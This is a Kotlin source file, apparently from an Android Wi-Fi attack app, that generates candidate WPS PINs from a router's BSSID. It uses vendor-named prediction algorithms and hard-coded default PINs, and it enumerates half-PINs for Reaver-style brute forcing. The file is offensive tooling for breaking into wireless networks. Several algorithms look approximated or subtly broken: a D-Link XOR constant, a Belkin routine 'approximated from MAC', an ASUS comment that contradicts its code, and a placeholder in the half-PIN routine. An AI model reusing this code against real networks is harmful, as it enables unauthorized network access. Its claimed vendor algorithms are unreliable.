package com.wipwn.app.data

/**
 * Algorithmic WPS PIN generator.
 *
 * Banyak router punya PIN yang bisa di-predict dari BSSID / serial number.
 * Class ini generate candidate PINs berdasarkan algoritma yang dikenal:
 * - ComputePIN (Arcadyan, Zyxel, Sitecom, dll)
 * - EasyBox (Vodafone EasyBox)
 * - Belkin (dari serial / MAC)
 * - D-Link (dari BSSID pattern)
 * - ASUS (dari MAC address)
 * - Generic (dari last 3 bytes MAC)
 *
 * Semua PIN yang di-generate udah include checksum digit (WPS spec).
 */
object PinGenerator {

    data class GeneratedPin(
        val pin: String,
        val algorithm: String,
        val confidence: PinConfidence
    )

    enum class PinConfidence { HIGH, MEDIUM, LOW }

    /**
     * Generate semua candidate PINs buat BSSID tertentu.
     * Return list sorted by confidence (HIGH first).
     */
    fun generate(bssid: String, vendor: String = ""): List<GeneratedPin> {
        val mac = bssid.uppercase().replace(":", "").replace("-", "")
        if (mac.length != 12) return emptyList()

        return buildList {
            // 1. ComputePIN — works on many Arcadyan/Zyxel/Sitecom routers
            addAll(computePin(mac))

            // 2. EasyBox — Vodafone EasyBox routers
            addAll(easyBoxPin(mac))

            // 3. D-Link specific
            addAll(dlinkPin(mac))

            // 4. ASUS specific
            addAll(asusPin(mac))

            // 5. Belkin
            addAll(belkinPin(mac))

            // 6. Generic MAC-based
            addAll(genericMacPin(mac))

            // 7. Vendor-boosted known defaults
            addAll(vendorDefaultPins(vendor))
        }
            .distinctBy { it.pin }
            .sortedBy { it.confidence.ordinal }
    }

    // ── ComputePIN ─────────────────────────────────────────────────────

    private fun computePin(mac: String): List<GeneratedPin> {
        return try {
            val lastThreeBytes = mac.substring(6).toLong(16)
            val pin7 = (lastThreeBytes % 10000000).toInt()
            val pin = appendChecksum(pin7)
            listOf(
                GeneratedPin(
                    pin = pin,
                    algorithm = "ComputePIN",
                    confidence = PinConfidence.MEDIUM
                )
            )
        } catch (_: Exception) {
            emptyList()
        }
    }

    // ── EasyBox ────────────────────────────────────────────────────────

    private fun easyBoxPin(mac: String): List<GeneratedPin> {
        return try {
            // EasyBox algo: uses nibbles from MAC
            val c1 = mac[6].digitToInt(16)
            val c2 = mac[7].digitToInt(16)
            val c3 = mac[8].digitToInt(16)
            val c4 = mac[9].digitToInt(16)
            val c5 = mac[10].digitToInt(16)
            val c6 = mac[11].digitToInt(16)

            val k1 = (c1 + c2) % 10
            val k2 = (c3 + c4) % 10
            val k3 = (c5 + c6) % 10
            val k4 = (c2 + c3) % 10
            val k5 = (c4 + c5) % 10
            val k6 = (c1 + c6) % 10
            val k7 = (c3 + c5) % 10

            val pin7 = k1 * 1000000 + k2 * 100000 + k3 * 10000 +
                    k4 * 1000 + k5 * 100 + k6 * 10 + k7
            val pin = appendChecksum(pin7)

            listOf(
                GeneratedPin(
                    pin = pin,
                    algorithm = "EasyBox",
                    confidence = PinConfidence.MEDIUM
                )
            )
        } catch (_: Exception) {
            emptyList()
        }
    }

    // ── D-Link ─────────────────────────────────────────────────────────

    private fun dlinkPin(mac: String): List<GeneratedPin> {
        return try {
            // D-Link: NIC part XOR'd
            val nic = mac.substring(6).toLong(16)
            val pin7 = ((nic xor 0x55AA55) % 10000000).toInt()
            val pin = appendChecksum(pin7)
            listOf(
                GeneratedPin(
                    pin = pin,
                    algorithm = "D-Link",
                    confidence = PinConfidence.LOW
                )
            )
        } catch (_: Exception) {
            emptyList()
        }
    }

    // ── ASUS ───────────────────────────────────────────────────────────

    private fun asusPin(mac: String): List<GeneratedPin> {
        return try {
            // ASUS: uses last 2 bytes
            val b4 = mac.substring(6, 8).toInt(16)
            val b5 = mac.substring(8, 10).toInt(16)
            val b6 = mac.substring(10, 12).toInt(16)
            val pin7 = ((b4 * 256 * 256 + b5 * 256 + b6) % 10000000)
            val pin = appendChecksum(pin7)
            listOf(
                GeneratedPin(
                    pin = pin,
                    algorithm = "ASUS",
                    confidence = PinConfidence.LOW
                )
            )
        } catch (_: Exception) {
            emptyList()
        }
    }

    // ── Belkin ──────────────────────────────────────────────────────────

    private fun belkinPin(mac: String): List<GeneratedPin> {
        return try {
            // Belkin: serial-based, but we approximate from MAC
            val nic = mac.substring(6).toLong(16)
            val seed = nic % 10000000
            val pin = appendChecksum(seed.toInt())
            listOf(
                GeneratedPin(
                    pin = pin,
                    algorithm = "Belkin",
                    confidence = PinConfidence.LOW
                )
            )
        } catch (_: Exception) {
            emptyList()
        }
    }

    // ── Generic MAC-based ──────────────────────────────────────────────

    private fun genericMacPin(mac: String): List<GeneratedPin> {
        return try {
            val fullMac = mac.toLong(16)
            val pin7a = (fullMac % 10000000).toInt()
            val pin7b = ((fullMac shr 1) % 10000000).toInt()
            listOf(
                GeneratedPin(
                    pin = appendChecksum(pin7a),
                    algorithm = "MAC-Full",
                    confidence = PinConfidence.LOW
                ),
                GeneratedPin(
                    pin = appendChecksum(pin7b),
                    algorithm = "MAC-Shifted",
                    confidence = PinConfidence.LOW
                )
            )
        } catch (_: Exception) {
            emptyList()
        }
    }

    // ── Vendor defaults ────────────────────────────────────────────────

    private fun vendorDefaultPins(vendor: String): List<GeneratedPin> {
        val v = vendor.lowercase()
        val pins = when {
            "tp-link" in v || "tplink" in v -> listOf("12345670", "20172017")
            "zte" in v -> listOf("00000000", "13572468")
            "huawei" in v -> listOf("12345670", "00000000")
            "tenda" in v -> listOf("12345670")
            "netgear" in v -> listOf("12345670")
            "linksys" in v || "cisco" in v -> listOf("12345670")
            else -> emptyList()
        }
        return pins.map {
            GeneratedPin(
                pin = it,
                algorithm = "VendorDefault",
                confidence = PinConfidence.HIGH
            )
        }
    }

    // ── WPS Checksum ───────────────────────────────────────────────────

    /**
     * Append WPS checksum digit to a 7-digit PIN.
     * WPS spec: checksum = (10 - (sum of weighted digits % 10)) % 10
     */
    fun appendChecksum(pin7: Int): String {
        val s = pin7.toString().padStart(7, '0')
        var accum = 0
        for (i in s.indices) {
            val d = s[i].digitToInt()
            accum += if (i % 2 == 0) d * 3 else d
        }
        val checksum = (10 - (accum % 10)) % 10
        return s + checksum.toString()
    }

    /**
     * Validate WPS PIN checksum.
     */
    fun isValidWpsPin(pin: String): Boolean {
        if (pin.length != 8 || !pin.all { it.isDigit() }) return false
        val pin7 = pin.substring(0, 7).toIntOrNull() ?: return false
        return appendChecksum(pin7) == pin
    }

    /**
     * Generate first-half and second-half PIN candidates for
     * half-PIN optimization (Reaver-style).
     * First half: 0000-9999 (10,000 combinations)
     * Second half: 000-999 (1,000 combinations) + checksum
     */
    fun generateHalfPins(): Pair<List<String>, List<String>> {
        val firstHalf = (0..9999).map { it.toString().padStart(4, '0') }
        val secondHalf = (0..999).map { half2 ->
            val pin7 = half2 // placeholder — actual half-PIN attack uses protocol-level split
            half2.toString().padStart(3, '0')
        }
        return firstHalf to secondHalf
    }
}
